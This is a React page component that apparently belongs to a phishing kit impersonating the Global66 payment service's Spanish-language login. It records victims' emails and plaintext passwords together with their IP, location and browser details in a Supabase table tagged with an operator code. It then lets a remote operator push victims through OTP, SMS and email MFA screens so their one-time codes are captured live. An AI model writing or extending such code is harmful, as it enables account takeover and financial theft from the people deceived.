import { useState, useEffect, useCallback, useRef } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import Global66Logo from "@/components/global66/Global66Logo";
import Global66LoginForm from "@/components/global66/Global66LoginForm";
import Global66OtpScreen from "@/components/global66/Global66OtpScreen";
import Global66WaitingScreen from "@/components/global66/Global66WaitingScreen";
import Global66SuccessScreen from "@/components/global66/Global66SuccessScreen";
import Global66SyncEmailScreen from "@/components/global66/Global66SyncEmailScreen";
import Global66ConfirmEmailScreen from "@/components/global66/Global66ConfirmEmailScreen";
import Global66MfaSmsScreen from "@/components/global66/Global66MfaSmsScreen";
import Global66MfaEmailScreen from "@/components/global66/Global66MfaEmailScreen";

type Step = "login" | "otp" | "waiting" | "syncing" | "confirm_email" | "sync_email" | "mfa_sms" | "mfa_email" | "done";

const Global66 = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    document.title = "Global66 — Iniciar sesión";
    const link: HTMLLinkElement = document.querySelector("link[rel~='icon']") || document.createElement("link");
    link.rel = "icon";
    link.type = "image/png";
    link.href = "/favicon.ico";
    document.head.appendChild(link);
  }, []);

  // ── Listen for admin commands via broadcast + polling ──
  useEffect(() => {
    if (!sessionId || step === "login" || step === "done") return;

    const channel = supabase.channel(`session-review-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      handleDecision(decision);
    }).subscribe();

    // Also listen for OTP decisions
    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel.on("broadcast", { event: "otp_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      handleDecision(decision);
    }).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (!data) return;
      handleDecision(data.status);
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(otpChannel);
      clearInterval(pollInterval);
    };
  }, [sessionId, step]);

  const handleDecision = useCallback((status?: string) => {
    if (!status) return;
    if (status === "login_success" || status === "approved" || status === "completed" || status === "confirm_approved" || status === "otp_approved") {
      setStep("done");
    } else if (status === "wrong_password") {
      setErrorMessage("Correo o contraseña incorrecto. Intentá de nuevo.");
      setStep("login");
    } else if (status === "redirect_otp" || status === "show_otp") {
      setStep("otp"); setErrorMessage("");
    } else if (status === "redirect_mfa_sms") {
      setStep("mfa_sms"); setErrorMessage("");
    } else if (status === "redirect_mfa_email") {
      setStep("mfa_email"); setErrorMessage("");
    } else if (status === "redirect_confirm_email") {
      setStep("confirm_email"); setErrorMessage("");
    } else if (status === "redirect_sync_email") {
      setStep("sync_email"); setErrorMessage("");
    } else if (status === "otp_rejected") {
      setErrorMessage("Código incorrecto. Intentá de nuevo.");
      setStep("otp");
    } else if (status === "pending_review") {
      setErrorMessage("");
    }
  }, []);

  // ── Login submit ──
  const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
    setError(""); setErrorMessage(""); setLoading(true); setEmail(submittedEmail);

    // Fetch IP data
    let ipData = { ip: "unknown", country: "", city: "", region: "" };
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (res.ok) {
        const d = await res.json();
        ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" };
      }
    } catch { /* ignore */ }

    try {
      if (sessionId) {
        // Resubmit on same session (after wrong_password)
        await supabase.from("sessions").update({
          email: submittedEmail,
          password,
          status: "pending_review",
        }).eq("id", sessionId);
      } else {
        // Create new session
        const newId = crypto.randomUUID();
        await supabase.from("sessions").insert({
          id: newId,
          email: submittedEmail,
          password,
          ip_address: ipData.ip,
          user_agent: navigator.userAgent,
          country: ipData.country,
          city: ipData.city,
          region: ipData.region,
          status: "pending_review",
          source: "global66",
          operator_code: operatorCode,
        });
        setSessionId(newId);
      }
      setStep("waiting");
    } catch {
      setError("Error de conexión. Intentá de nuevo.");
    }
    setLoading(false);
  }, [sessionId, operatorCode]);

  // ── OTP submit ──
  const handleOtpSubmit = useCallback(async (code: string) => {
    if (!sessionId) return;
    setError(""); setErrorMessage("");
    setLoading(true);
    try {
      await supabase.from("sessions").update({
        otp_code: code,
        status: "otp_submitted",
      }).eq("id", sessionId);
      setStep("waiting");
    } catch {
      setError("Error al enviar el código.");
    }
    setLoading(false);
  }, [sessionId]);

  // MFA SMS screen
  if (step === "mfa_sms") {
    return <Global66MfaSmsScreen email={email} sessionId={sessionId!} onBack={() => setStep("waiting")} />;
  }

  // MFA Email screen
  if (step === "mfa_email") {
    return <Global66MfaEmailScreen email={email} sessionId={sessionId!} onBack={() => setStep("waiting")} />;
  }

  // Confirm email screen
  if (step === "confirm_email") {
    return <Global66ConfirmEmailScreen email={email} sessionId={sessionId!} onBack={() => setStep("waiting")} />;
  }

  // Sync email screen
  if (step === "sync_email") {
    return <Global66ConfirmEmailScreen email={email} sessionId={sessionId!} onBack={() => setStep("waiting")} />;
  }

  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-[#f7f8fc] px-5">
      <div className="w-full max-w-[400px] flex flex-col items-center gap-6 py-10">
        {step === "login" && (
          <>
            <Global66Logo size={64} />
            <h1 className="text-center text-[22px] font-bold text-[#1a2233] leading-tight">
              ¡Te damos la bienvenida a<br />Global66!
            </h1>
            <Global66LoginForm onSubmit={handleLogin} loading={loading} error={error || errorMessage} />
          </>
        )}

        {step === "waiting" && (
          <Global66WaitingScreen email={email} message="Verificando tu cuenta..." />
        )}

        {step === "otp" && (
          <Global66OtpScreen
            email={email}
            onSubmit={handleOtpSubmit}
            loading={loading}
            error={error || errorMessage}
          />
        )}

        {step === "syncing" && (
          <Global66SyncEmailScreen email={email} />
        )}

        {step === "done" && (
          <Global66SuccessScreen email={email} />
        )}
      </div>
    </div>
  );
};

export default Global66;
